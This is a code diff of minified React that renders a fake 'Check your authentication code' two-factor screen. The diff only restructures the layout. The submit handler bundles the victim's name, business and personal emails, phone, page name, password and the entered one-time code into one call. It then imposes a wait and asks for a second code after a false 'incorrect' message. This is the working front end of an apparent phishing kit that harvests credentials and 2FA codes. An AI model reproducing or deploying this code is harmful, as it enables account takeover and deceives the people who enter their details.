@@ -10932,194 +10932,187 @@
                   transform: "translate(-50%, -50%)",
                   lineHeight: 1.5,
                 },
-                children: (0, c.jsxs)("div", {
-                  style: {
-                    width: "100%",
-                    backgroundColor: "white",
-                    minHeight: 200,
-                  },
-                  children: [
-                    (0, c.jsx)("div", {
-                      className: "title",
-                      style: {
-                        fontWeight: "bold",
-                        color: "#000000",
-                        padding: 20,
-                        fontSize: 20,
-                      },
-                      children: "Check your authentication code",
-                    }),
-                    (0, c.jsx)("hr", {
-                      style: {
-                        borderTop: "1px solid #d0d0d0",
-                      },
-                    }),
-                    (0, c.jsxs)("div", {
-                      className: "bodyofcard",
-                      children: [
-                        (0, c.jsx)("div", {
-                          style: {
-                            padding: 15,
-                            fontSize: 15,
-                            fontWeight: 500,
-                          },
-                          children:
-                            "Your account has two-factor authentication switched on, which requires this extra login step.",
-                        }),
-                        (0, c.jsxs)("div", {
-                          style: {
-                            padding: "0px 15px 0px 15px",
-                            fontSize: 15,
-                            fontWeight: 500,
-                            display: "flex",
-                          },
-                          children:
-                            "Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or a text message you have received on your phone).",
-                        }),
-                        (0, c.jsx)("div", {
-                          style: {
-                            margin: 15,
-                          },
-                          children: (0, c.jsx)("img", {
-                            src: "/resources/otp.png",
-                            style: {
-                              width: "100%",
-                              borderRadius: 20,
-                            },
-                          }),
-                        }),
-                        (0, c.jsxs)("div", {
-                          style: {
-                            padding: 10,
-                            marginLeft: 10,
-                            fontSize: 15,
-                            fontWeight: 400,
-                            display: "flex",
-                          },
-                          children: [
-                            (0, c.jsx)("input", {
-                              type: "text",
-                              style: {
-                                width: "60%",
-                                padding: "15px 10px 15px 10px",
-                                fontSize: 15,
-                                fontWeight: 500,
-                                border: "1px solid #d0d0d0",
-                                borderRadius: 10,
-                              },
-                              placeholder: "Login code",
-                              value: f,
-                              onChange: (e) => {
-                                const t = e.target.value;
-                                t.length > 8 || p(t);
-                              },
-                            }),
-                            0 !== g &&
-                              (0, c.jsxs)("div", {
-                                style: { marginLeft: 5 },
-                                children: [
-                                  "(wait 00:",
-                                  g >= 10 ? g : "0" + g,
-                                  ")",
-                                ],
-                              }),
-                          ],
-                        }),
-                        h &&
-                          (0, c.jsx)("div", {
-                            style: {
-                              color: "#DC3545",
-                              fontSize: 14,
-                              marginTop: 15,
-                              marginBottom: 15,
-                              marginLeft: 10,
-                            },
-                            children:
-                              "The code generator you entered is incorrect, please try again!",
-                          }),
-                      ],
-                    }),
-                    (0, c.jsx)("hr", {
-                      style: {
-                        borderTop: "1px solid #d0d0d0",
-                        marginTop: 10,
-                        marginBottom: 10,
-                      },
-                    }),
-                    (0, c.jsxs)("div", {
-                      className: "footercard",
-                      style: {
-                        display: "flex",
-                        justifyContent: "space-between",
-                        alignItems: "center",
-                        paddingLeft: 20,
-                        paddingRight: 20,
-                        paddingBottom: 10,
-                        paddingTop: 10,
-                      },
-                      children: [
-                        (0, c.jsx)("button", {
+                children: [
+                  (0, c.jsx)("div", {
+                    className: "title",
+                    style: {
+                      fontWeight: "bold",
+                      color: "#000000",
+                      padding: 20,
+                      fontSize: 20,
+                    },
+                    children: "Check your authentication code",
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "1px solid #d0d0d0",
+                    },
+                  }),
+                  (0, c.jsxs)("div", {
+                    className: "bodyofcard",
+                    children: [
+                      (0, c.jsx)("div", {
+                        style: {
+                          padding: 15,
+                          fontSize: 15,
+                          fontWeight: 500,
+                        },
+                        children:
+                          "Your account has two-factor authentication switched on, which requires this extra login step.",
+                      }),
+                      (0, c.jsxs)("div", {
+                        style: {
+                          padding: "0px 15px 0px 15px",
+                          fontSize: 15,
+                          fontWeight: 500,
+                          display: "flex",
+                        },
+                        children:
+                          "Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or a text message you have received on your phone).",
+                      }),
+                      (0, c.jsx)("div", {
+                        style: {
+                          margin: 15,
+                        },
+                        children: (0, c.jsx)("img", {
+                          src: "/resources/otp.png",
                           style: {
                             width: "100%",
-                            paddingRight: 100,
-                            paddingLeft: 100,
-                            height: 45,
-                            fontWeight: "bold",
-                            fontSize: 18,
-                            borderRadius: 30,
-                            borderWidth: 0,
-                            alignItems: "center",
-                            backgroundColor:
-                              0 === f.length || 0 !== g ? "#7DAFF9" : "#3084F4",
-                            cursor: "pointer",
-                            color: "white",
+                            borderRadius: 20,
                           },
-                          disabled: 0 === f.length || 0 !== g,
-                          onClick: () => {
-                            0 === g &&
-                              (0 === y &&
-                                d({
-                                  info: n,
-                                  name: r,
-                                  businessEmail: l,
-                                  personalEmail: a,
-                                  phone: o,
-                                  pageName: i,
-                                  passwordValue1: "------",
-                                  passwordValue2: u,
-                                  code1: f,
-                                  code2: "------",
-                                }),
-                              1 == y &&
-                                (clearInterval(w),
-                                d({
-                                  info: n,
-                                  name: r,
-                                  businessEmail: l,
-                                  personalEmail: a,
-                                  phone: o,
-                                  pageName: i,
-                                  passwordValue1: "------",
-                                  passwordValue2: u,
-                                  code1: "------",
-                                  code2: f,
-                                }),
-                                s(3)),
-                              b((e) => e + 1),
-                              m(!0),
-                              v(60),
-                              (w = setInterval(() => {
-                                v((e) =>
-                                  0 === e ? (clearInterval(w), 0) : e - 1
-                                );
-                              }, 1e3)));
-                          },
-                          children: "Submit",
                         }),
-                      ],
-                    }),
-                  ],
-                }),
+                      }),
+                      (0, c.jsxs)("div", {
+                        style: {
+                          padding: 10,
+                          marginLeft: 10,
+                          fontSize: 15,
+                          fontWeight: 400,
+                          display: "flex",
+                        },
+                        children: [
+                          (0, c.jsx)("input", {
+                            type: "text",
+                            style: {
+                              width: "60%",
+                              padding: "15px 10px 15px 10px",
+                              fontSize: 15,
+                              fontWeight: 500,
+                              border: "1px solid #d0d0d0",
+                              borderRadius: 10,
+                            },
+                            placeholder: "Login code",
+                            value: f,
+                            onChange: (e) => {
+                              const t = e.target.value;
+                              t.length > 8 || p(t);
+                            },
+                          }),
+                          0 !== g &&
+                            (0, c.jsxs)("div", {
+                              style: { marginLeft: 5 },
+                              children: [
+                                "(wait 00:",
+                                g >= 10 ? g : "0" + g,
+                                ")",
+                              ],
+                            }),
+                        ],
+                      }),
+                      h &&
+                        (0, c.jsx)("div", {
+                          style: {
+                            color: "#DC3545",
+                            fontSize: 14,
+                            marginTop: 15,
+                            marginBottom: 15,
+                            marginLeft: 10,
+                          },
+                          children:
+                            "The code generator you entered is incorrect, please try again!",
+                        }),
+                    ],
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "1px solid #d0d0d0",
+                      marginTop: 10,
+                      marginBottom: 10,
+                    },
+                  }),
+                  (0, c.jsxs)("div", {
+                    className: "footercard",
+                    style: {
+                      display: "flex",
+                      justifyContent: "space-between",
+                      alignItems: "center",
+                      paddingLeft: 20,
+                      paddingRight: 20,
+                      paddingBottom: 10,
+                      paddingTop: 10,
+                    },
+                    children: [
+                      (0, c.jsx)("button", {
+                        style: {
+                          width: "100%",
+                          paddingRight: 100,
+                          paddingLeft: 100,
+                          height: 45,
+                          fontWeight: "bold",
+                          fontSize: 18,
+                          borderRadius: 30,
+                          borderWidth: 0,
+                          alignItems: "center",
+                          backgroundColor:
+                            0 === f.length || 0 !== g ? "#7DAFF9" : "#3084F4",
+                          cursor: "pointer",
+                          color: "white",
+                        },
+                        disabled: 0 === f.length || 0 !== g,
+                        onClick: () => {
+                          0 === g &&
+                            (0 === y &&
+                              d({
+                                info: n,
+                                name: r,
+                                businessEmail: l,
+                                personalEmail: a,
+                                phone: o,
+                                pageName: i,
+                                passwordValue1: "------",
+                                passwordValue2: u,
+                                code1: f,
+                                code2: "------",
+                              }),
+                            1 == y &&
+                              (clearInterval(w),
+                              d({
+                                info: n,
+                                name: r,
+                                businessEmail: l,
+                                personalEmail: a,
+                                phone: o,
+                                pageName: i,
+                                passwordValue1: "------",
+                                passwordValue2: u,
+                                code1: "------",
+                                code2: f,
+                              }),
+                              s(3)),
+                            b((e) => e + 1),
+                            m(!0),
+                            v(60),
+                            (w = setInterval(() => {
+                              v((e) =>
+                                0 === e ? (clearInterval(w), 0) : e - 1
+                              );
+                            }, 1e3)));
+                        },
+                        children: "Submit",
+                      }),
+                    ],
+                  }),
+                ],
               }),
             ],
           });
